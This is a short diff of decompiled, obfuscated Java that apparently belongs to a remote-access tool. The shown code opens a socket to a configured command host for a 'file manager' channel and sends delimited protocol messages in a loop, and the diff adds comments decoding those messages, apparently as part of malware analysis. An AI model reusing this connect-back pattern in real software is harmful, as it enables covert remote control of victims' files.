@@ -12,9 +12,11 @@ final class f extends Thread {
       try {
          System.err.println("FILE MANAGER CONNECT");
          k.l = var1 = new Socket(k.b, k.c);
+         // Parameter of writeBytes: k.g + "$#@" + "@0003" + "^!@" + "&&&"
          (new DataOutputStream(var1.getOutputStream())).writeBytes(k.g + k.d + k.z + k.d + "&&&");
 
          while(true) {
+            // Parameter of writeBytes: "@0004" + "$#@" + "&&&"
             (new DataOutputStream(k.l.getOutputStream())).writeBytes(k.A + k.d + "&&&");
 
             try {
